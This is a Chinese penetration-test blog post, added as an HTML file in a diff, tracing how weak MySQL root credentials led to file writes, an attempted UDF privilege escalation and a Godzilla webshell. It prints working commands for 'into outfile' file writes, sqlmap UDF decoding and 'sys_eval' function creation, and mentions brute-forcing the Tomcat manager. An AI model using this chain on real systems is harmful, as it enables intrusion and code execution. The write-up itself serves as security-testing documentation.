@@ -1,0 +1,792 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Ustin1an">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="从 MySQL 弱口令到哥斯拉上线给一个客户系统做渗透，记录下过程 信息收集没有测试账号，本来没抱希望，打算找几个水洞，找不到洞，尝试扫个端口发现 3306 是开放的  弱口令习惯性尝试使用 root&#x2F;root 连接数据库，连接成功  数据泄露数据库查询到用户信息，密码为md5存储  查询得到账号信息：  登陆成功，共两个管理员账号  尝试写🐎在web应用没有找到上传点，尝试数据库写🐎试试 写">
+<meta property="og:type" content="article">
+<meta property="og:title" content="从 MySQL 弱口令到哥斯拉上线">
+<meta property="og:url" content="https://52hertz.tech/2023/04/12/mysql_weakpass_getshell/index.html">
+<meta property="og:site_name" content="Ustin1an&#39;s Blog">
+<meta property="og:description" content="从 MySQL 弱口令到哥斯拉上线给一个客户系统做渗透，记录下过程 信息收集没有测试账号，本来没抱希望，打算找几个水洞，找不到洞，尝试扫个端口发现 3306 是开放的  弱口令习惯性尝试使用 root&#x2F;root 连接数据库，连接成功  数据泄露数据库查询到用户信息，密码为md5存储  查询得到账号信息：  登陆成功，共两个管理员账号  尝试写🐎在web应用没有找到上传点，尝试数据库写🐎试试 写">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://img.tucang.cc/api/image/show/e0991aa643bf2946fca602c3f8f057b3">
+<meta property="og:image" content="https://img.tucang.cc/api/image/show/41f2ad6ad45f2686bb0d917f591ccbb1">
+<meta property="og:image" content="https://img.tucang.cc/api/image/show/32bf4c2082bca9fa088c85815577c0f7">
+<meta property="og:image" content="https://img.tucang.cc/api/image/show/3da435c12edd4182def638a85191d69b">
+<meta property="og:image" content="https://img.tucang.cc/api/image/show/3072f49bcb28f10ce3ef618a8f6bc6d7">
+<meta property="og:image" content="https://img.tucang.cc/api/image/show/89f7d72b1ac549026f724587fe3ca9af">
+<meta property="og:image" content="https://img.tucang.cc/api/image/show/aa1fec1a257db5b2a32c3f28c2cc7830">
+<meta property="og:image" content="https://img.tucang.cc/api/image/show/d913118d5612b7a471f3ab611d8e3a8e">
+<meta property="og:image" content="https://img.tucang.cc/api/image/show/6fbdc3357007d6c20aea8c3854014db1">
+<meta property="og:image" content="https://img.tucang.cc/api/image/show/75bd932cb82b2bfbac582baffb87ecfd">
+<meta property="og:image" content="https://img.tucang.cc/api/image/show/54a2e1db3edfe8c4e88304d2dcdb02ce">
+<meta property="og:image" content="https://img.tucang.cc/api/image/show/f883960dbe9c01981811403e5f04e35b">
+<meta property="og:image" content="https://img.tucang.cc/api/image/show/34d3e091b7bcf3ada67ce6eaa1c555bf">
+<meta property="og:image" content="https://img.tucang.cc/api/image/show/ce64b702b3dcb17afd38ee1858b6e3ee">
+<meta property="og:image" content="https://img.tucang.cc/api/image/show/999a058084b7703576f84f514965b2eb">
+<meta property="og:image" content="https://img.tucang.cc/api/image/show/ea6f3f684a4731f6a6bf0e211ba348c2">
+<meta property="og:image" content="https://img.tucang.cc/api/image/show/4fd06fe2e31f93d9e0e7aea1ecc461d5">
+<meta property="og:image" content="https://img.tucang.cc/api/image/show/b89b1a5cc347484ee605b72a91287c2d">
+<meta property="og:image" content="https://img.tucang.cc/api/image/show/dd7ba1ab43d6b56019cee457093b33cf">
+<meta property="og:image" content="https://img.tucang.cc/api/image/show/80ae4e9ffd0fdd099124d29d0baf80b3">
+<meta property="og:image" content="https://img.tucang.cc/api/image/show/59635ab512f922d0f7ce00504567bb2a">
+<meta property="og:image" content="https://img.tucang.cc/api/image/show/94f7dbfb2715705e3a8e2f5eebf70e61">
+<meta property="og:image" content="https://img.tucang.cc/api/image/show/55b63ead9084d03ab1510957ec423724">
+<meta property="og:image" content="https://img.tucang.cc/api/image/show/76e43b161928a96474abb162bda578de">
+<meta property="og:image" content="https://img.tucang.cc/api/image/show/828e847b3da51385fc9f40eefcb79e64">
+<meta property="article:published_time" content="2023-04-12T10:21:13.000Z">
+<meta property="article:modified_time" content="2023-07-03T03:25:47.260Z">
+<meta property="article:author" content="Ustin1an">
+<meta property="article:tag" content="Web">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://img.tucang.cc/api/image/show/e0991aa643bf2946fca602c3f8f057b3">
+  
+  
+  
+  <title>从 MySQL 弱口令到哥斯拉上线 - Ustin1an&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"52hertz.tech","root":"/","version":"1.9.5-a","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="从 MySQL 弱口令到哥斯拉上线"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-04-12 18:21" pubdate>
+          2023年4月12日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.9k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          25 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">从 MySQL 弱口令到哥斯拉上线</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="从-MySQL-弱口令到哥斯拉上线"><a href="#从-MySQL-弱口令到哥斯拉上线" class="headerlink" title="从 MySQL 弱口令到哥斯拉上线"></a>从 MySQL 弱口令到哥斯拉上线</h1><p>给一个客户系统做渗透，记录下过程</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>没有测试账号，本来没抱希望，打算找几个水洞，找不到洞，尝试扫个端口发现 3306 是开放的</p>
+<p><img src="https://img.tucang.cc/api/image/show/e0991aa643bf2946fca602c3f8f057b3" srcset="/img/loading.gif" lazyload alt="image-20230412182240949"></p>
+<h2 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h2><p>习惯性尝试使用 <code>root/root</code> 连接数据库，连接成功</p>
+<p><img src="https://img.tucang.cc/api/image/show/41f2ad6ad45f2686bb0d917f591ccbb1" srcset="/img/loading.gif" lazyload alt="image-20230412182344175"></p>
+<h2 id="数据泄露"><a href="#数据泄露" class="headerlink" title="数据泄露"></a>数据泄露</h2><p>数据库查询到用户信息，密码为md5存储</p>
+<p><img src="https://img.tucang.cc/api/image/show/32bf4c2082bca9fa088c85815577c0f7" srcset="/img/loading.gif" lazyload alt="image-20230412182914040"></p>
+<p>查询得到账号信息：</p>
+<p><img src="https://img.tucang.cc/api/image/show/3da435c12edd4182def638a85191d69b" srcset="/img/loading.gif" lazyload alt="image-20230412182837718"></p>
+<p>登陆成功，共两个管理员账号</p>
+<p><img src="https://img.tucang.cc/api/image/show/3072f49bcb28f10ce3ef618a8f6bc6d7" srcset="/img/loading.gif" lazyload alt="image-20230412182938172"></p>
+<h2 id="尝试写🐎"><a href="#尝试写🐎" class="headerlink" title="尝试写🐎"></a>尝试写🐎</h2><p>在web应用没有找到上传点，尝试数据库写🐎试试</p>
+<p>写文件的前提：</p>
+<ol>
+<li>知道网站物理路径</li>
+<li>高权限数据库用户</li>
+<li><code>load_file()</code> 开启 即 <code>secure_file_priv</code> 无限制</li>
+<li>网站路径有写入权限</li>
+</ol>
+<p>查看<code>secure_file_priv</code> 为空</p>
+<p><img src="https://img.tucang.cc/api/image/show/89f7d72b1ac549026f724587fe3ca9af" srcset="/img/loading.gif" lazyload alt="image-20230412145715965"></p>
+<table>
+<thead>
+<tr>
+<th>Value</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>NULL</td>
+<td>不允许导入或导出</td>
+</tr>
+<tr>
+<td>&#x2F;tmp</td>
+<td>只允许在 &#x2F;tmp 目录导入导出</td>
+</tr>
+<tr>
+<td>空</td>
+<td>不限制目录</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>在 MySQL 5.5 之前 secure_file_priv 默认是空，这个情况下可以向任意绝对路径写文件</p>
+<p>在 MySQL 5.5 之后 secure_file_priv 默认是 NULL，这个情况下不可以写文件</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select &#x27;hello&#x27; into outfile &#x27;xxxxx/123.txt&#x27;;<br></code></pre></td></tr></table></figure>
+
+<p>文件可以写入，并且可以读出来</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">select load_file(&#x27;xxxxxx/123.txt&#x27;);<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://img.tucang.cc/api/image/show/aa1fec1a257db5b2a32c3f28c2cc7830" srcset="/img/loading.gif" lazyload alt="image-20230412183651820"></p>
+<p>但找遍了数据库也没找到有出现 web 应用路径的地方</p>
+<h2 id="尝试UDF提权"><a href="#尝试UDF提权" class="headerlink" title="尝试UDF提权"></a>尝试UDF提权</h2><h3 id="MUDT"><a href="#MUDT" class="headerlink" title="MUDT"></a>MUDT</h3><p>我们是直接连的数据库，没有注入点，因此无法用sqlmap进行提权，先尝试一波 MDUT 工具，看看能不能提权</p>
+<p><img src="https://img.tucang.cc/api/image/show/d913118d5612b7a471f3ab611d8e3a8e" srcset="/img/loading.gif" lazyload alt="image-20230412182635522"></p>
+<p>但创建函数失败</p>
+<p><img src="https://img.tucang.cc/api/image/show/6fbdc3357007d6c20aea8c3854014db1" srcset="/img/loading.gif" lazyload alt="WeChatWorkScreenshot_e83eb0cc-441d-4cd9-817f-9ec641eb6cb3"></p>
+<h3 id="手动尝试一次"><a href="#手动尝试一次" class="headerlink" title="手动尝试一次"></a>手动尝试一次</h3><h4 id="plugin-文件夹"><a href="#plugin-文件夹" class="headerlink" title="plugin 文件夹"></a>plugin 文件夹</h4><p>如果是 MySQL &gt;&#x3D; 5.1 的版本，必须把 UDF 的动态链接库文件放置于 MySQL 安装目录下的 lib\plugin 文件夹下文件夹下才能创建自定义函数。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">show variables like &#x27;%plugin%&#x27;;<br></code></pre></td></tr></table></figure>
+
+<p>已经存在 <code>plugin</code> 文件夹了</p>
+<p><img src="https://img.tucang.cc/api/image/show/75bd932cb82b2bfbac582baffb87ecfd" srcset="/img/loading.gif" lazyload alt="image-20230412183354599"></p>
+<p>如果不存在的话可以在 webshell 中找到 MySQL 的安装目录然后手工创建 <code>\lib\plugin</code> 文件夹：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mysql &gt; <span class="hljs-keyword">select</span> 123 into dumpfile <span class="hljs-string">&#x27;C:\\PhpStudy\\PHPTutorial\\MySQL\\lib\\plugin::$index_allocation&#x27;</span>;<br></code></pre></td></tr></table></figure>
+
+<h4 id="传入动态链接库文件"><a href="#传入动态链接库文件" class="headerlink" title="传入动态链接库文件"></a>传入动态链接库文件</h4><p>那么动态链接库文件去哪里找呢？实际上我们常用的工具 sqlmap 和 Metasploit 里面都自带了对应系统的动态链接库文件。</p>
+<ul>
+<li><strong>sqlmap 的 UDF 动态链接库文件位置</strong></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sqlmap根目录/data/udf/mysql<br></code></pre></td></tr></table></figure>
+
+<p>白嫖个图：</p>
+<p><img src="https://img.tucang.cc/api/image/show/54a2e1db3edfe8c4e88304d2dcdb02ce" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>不过 sqlmap 中 自带这些动态链接库为了防止被误杀都经过编码处理过，不能被直接使用。不过可以利用 sqlmap 自带的解码工具 cloak.py 来解码使用，cloak.py 的位置为：<code>/extra/cloak/cloak.py</code> ，解码方法如下：（白嫖个方法）</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 查看当前目录情况</span><br>➜ <span class="hljs-built_in">pwd</span><br>/Users/guang/Documents/X1ct34m/sqlmap/1.4.6/extra/cloak<br><br><span class="hljs-comment"># 解码 32 位的 Linux 动态链接库</span><br>➜ python3 cloak.py -d -i ../../data/udf/mysql/linux/32/lib_mysqludf_sys.so_ -o lib_mysqludf_sys_32.so<br><br><span class="hljs-comment"># 解码 64 位的 Linux 动态链接库</span><br>➜ python3 cloak.py -d -i ../../data/udf/mysql/linux/64/lib_mysqludf_sys.so_ -o lib_mysqludf_sys_64.so<br><br><span class="hljs-comment"># 解码 32 位的 Windows 动态链接库</span><br>➜ python3 cloak.py -d -i ../../data/udf/mysql/windows/32/lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_32.dll<br><br><span class="hljs-comment"># 解码 64 位的 Windows 动态链接库</span><br>➜ python3 cloak.py -d -i ../../data/udf/mysql/windows/64/lib_mysqludf_sys.dll_ -o lib_mysqludf_sys_64.dll<br><br><span class="hljs-comment"># 查看当前目录下的情况</span><br>➜ <span class="hljs-built_in">ls</span><br>README.txt              cloak.py                lib_mysqludf_sys_32.so  lib_mysqludf_sys_64.so<br>__init__.py             lib_mysqludf_sys_32.dll lib_mysqludf_sys_64.dll<br></code></pre></td></tr></table></figure>
+
+<p>这个博主打包了 sqlmap 解码后的动态链接库：<a target="_blank" rel="noopener" href="https://sqlsec.lanzoux.com/i4b7jhyhwid">蓝奏云 - sqlmap udf.zip</a> 需要的朋友可以自提</p>
+<ul>
+<li><strong>Metasploit 的 UDF 动态链接库文件位置</strong></li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">MSF 根目录/embedded/framework/data/exploits/mysql<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://img.tucang.cc/api/image/show/f883960dbe9c01981811403e5f04e35b" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>Metasploit 自带的动态链接库文件无需解码，开箱即可食用。</p>
+<p>使用 010-Editor 对比了 metsaploit 自带的与 sqlmap 解码后的动态链接库文件，发现他们的内容一模一样。</p>
+<p>下面来看下动态链接库里面有包含了哪些函数：</p>
+<p><img src="https://img.tucang.cc/api/image/show/34d3e091b7bcf3ada67ce6eaa1c555bf" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>如果有注入点的话可以尝试用 SQLMAP，这里没有，接着手动</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"># 直接 <span class="hljs-keyword">SELECT</span> 查询十六进制写入<br><span class="hljs-keyword">SELECT</span> <span class="hljs-number">0x7f454c4602</span>... <span class="hljs-keyword">INTO</span> DUMPFILE <span class="hljs-string">&#x27;xxxxx/plugin/udf.dll&#x27;</span>;<br></code></pre></td></tr></table></figure>
+
+<p>这里有十六进制的语句，将路径改成实际路径即可 <a target="_blank" rel="noopener" href="https://www.sqlsec.com/udf/">UDF十六进制</a></p>
+<h4 id="创建自定义函数并调用命令"><a href="#创建自定义函数并调用命令" class="headerlink" title="创建自定义函数并调用命令"></a>创建自定义函数并调用命令</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mysql">mysql &gt; CREATE FUNCTION sys_eval RETURNS STRING SONAME &#x27;udf.dll&#x27;;<br></code></pre></td></tr></table></figure>
+
+<p>这里依旧报错</p>
+<p><img src="https://img.tucang.cc/api/image/show/ce64b702b3dcb17afd38ee1858b6e3ee" srcset="/img/loading.gif" lazyload alt="image-20230412184927566"></p>
+<blockquote>
+<p>1123 - Can’t initialize function ‘sys_eval’; UDFs are unavailable with the –skip-grant-tables option</p>
+</blockquote>
+<p>需要将 <code>my.ini</code> 中的 <code>skip-grant-tables</code> 选项去掉</p>
+<p>读 <code>xxxxx/my.ini</code> 也看到确实存在，但这里没法操作，只好作罢</p>
+<p><img src="https://img.tucang.cc/api/image/show/999a058084b7703576f84f514965b2eb" srcset="/img/loading.gif" lazyload alt="image-20230412184947048"></p>
+<h2 id="Druid-未授权"><a href="#Druid-未授权" class="headerlink" title="Druid 未授权"></a>Druid 未授权</h2><p>就当要放弃的时候，发现了一个 <code>Druid 未授权</code>，可谓是救命稻草，现在就缺一个路径，真是送到嘴边了</p>
+<p><img src="https://img.tucang.cc/api/image/show/ea6f3f684a4731f6a6bf0e211ba348c2" srcset="/img/loading.gif" lazyload alt="image-20230412185141640"></p>
+<h2 id="默认页面未删除"><a href="#默认页面未删除" class="headerlink" title="默认页面未删除"></a>默认页面未删除</h2><p>同时 <code>dirsearch</code> 收集信息的时候，也发现了默认页面：</p>
+<p><img src="https://img.tucang.cc/api/image/show/4fd06fe2e31f93d9e0e7aea1ecc461d5" srcset="/img/loading.gif" lazyload alt="image-20230412185238598"></p>
+<p>真的是非常贴心了</p>
+<p><img src="https://img.tucang.cc/api/image/show/b89b1a5cc347484ee605b72a91287c2d" srcset="/img/loading.gif" lazyload alt="image-20230412185327670"></p>
+<p>怕我看不懂，还给我解释了：</p>
+<blockquote>
+<p>where “$CATALINA_HOME” is the root of the Tomcat installation directory.</p>
+</blockquote>
+<h2 id="继续写🐎"><a href="#继续写🐎" class="headerlink" title="继续写🐎"></a>继续写🐎</h2><p>直接用路径拼接，传一个 hello 上去</p>
+<p><img src="https://img.tucang.cc/api/image/show/dd7ba1ab43d6b56019cee457093b33cf" srcset="/img/loading.gif" lazyload alt="image-20230412185733751"></p>
+<p>成功 hello</p>
+<p><img src="https://img.tucang.cc/api/image/show/80ae4e9ffd0fdd099124d29d0baf80b3" srcset="/img/loading.gif" lazyload alt="image-20230412185813134"></p>
+<h2 id="上线"><a href="#上线" class="headerlink" title="上线"></a>上线</h2><p>直接上马（这里一直在调试，从 <code>1.jsp</code> 迭代到 <code>6.jsp</code> 了）</p>
+<p><img src="https://img.tucang.cc/api/image/show/59635ab512f922d0f7ce00504567bb2a" srcset="/img/loading.gif" lazyload alt="image-20230412185858078"></p>
+<p>哥斯拉上线</p>
+<p><img src="https://img.tucang.cc/api/image/show/94f7dbfb2715705e3a8e2f5eebf70e61" srcset="/img/loading.gif" lazyload alt="image-20230412190111914"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">whoami</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://img.tucang.cc/api/image/show/55b63ead9084d03ab1510957ec423724" srcset="/img/loading.gif" lazyload alt="image-20230412190139502"></p>
+<h2 id="x2F-manager-x2F-html"><a href="#x2F-manager-x2F-html" class="headerlink" title="&#x2F;manager&#x2F;html"></a>&#x2F;manager&#x2F;html</h2><p>另外也找到 <code>xxxx:8080/manager/html</code> 了，拿 <code>msf</code> 进行了一次常规默认密码爆破，并没有爆出</p>
+<p>后来拿到物理路径也刚好读一下<code>xxxxx/conf/tomcat-users.xml</code></p>
+<p><img src="https://img.tucang.cc/api/image/show/76e43b161928a96474abb162bda578de" srcset="/img/loading.gif" lazyload alt="image-20230412185534061"></p>
+<p>但密码还是不正确，这个点没法用</p>
+<p><img src="https://img.tucang.cc/api/image/show/828e847b3da51385fc9f40eefcb79e64" srcset="/img/loading.gif" lazyload alt="image-20230412190750048"></p>
+<p>因为本身就是测的内网系统，就不做内网渗透了（不是因为不会</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Web/" class="category-chain-item">Web</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Web/" class="print-no-link">#Web</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>从 MySQL 弱口令到哥斯拉上线</div>
+      <div>https://52hertz.tech/2023/04/12/mysql_weakpass_getshell/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Ustin1an</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年4月12日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/12/22/Wechat_revoke/" title="PC 端微信防撤回与多开 Patch">
+                        <span class="hidden-mobile">PC 端微信防撤回与多开 Patch</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
